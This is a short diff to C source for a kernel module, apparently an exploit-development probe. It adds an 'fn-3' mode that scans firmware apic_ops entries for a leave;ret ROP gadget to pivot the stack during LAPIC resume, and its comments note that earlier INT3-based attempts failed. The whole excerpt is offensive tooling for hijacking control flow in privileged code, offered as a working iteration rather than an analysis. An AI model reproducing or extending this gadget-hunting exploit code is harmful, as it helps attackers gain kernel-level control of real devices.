@@ -1,7 +1,7 @@
 #include <stdint.h>
 
 /*
- * resume_chain v10a — fn-2 probe for leave;ret gadget discovery
+ * resume_chain v10a2 — fn-2/fn-3 probe for leave;ret gadget discovery
  *
  * INT3 (CC) during LAPIC resume is BROKEN (v3, v9a both failed).
  * Alternative: find a leave;ret (C9 C3) gadget for stack pivot.
@@ -10,6 +10,7 @@
  * If so, calling fn-2 executes leave;ret → RSP=RBP → stack pivot.
  *
  * fw_ver encoding:
+ *   0xCC00 + entry_index → probe fn-3 of that apic_ops entry
  *   0xDD00 + entry_index → probe fn-2 of that apic_ops entry
  *   0xEE00 + entry_index → probe fn-1 (v8f mode, for reference)
  *
@@ -167,6 +168,8 @@ int module_start(kproc_args *args)
         probe_offset = 2;  /* fn-2 probe */
     } else if (mode_prefix == 0xEE) {
         probe_offset = 1;  /* fn-1 probe (v8f compatible) */
+    } else if (mode_prefix == 0xCC) {
+        probe_offset = 3;  /* fn-3 probe (looking for C9 before 48 C3) */
     } else {
         /* Unknown mode — clear and report */
         for (int i = 0; i < 64; i++) out[i] = 0;
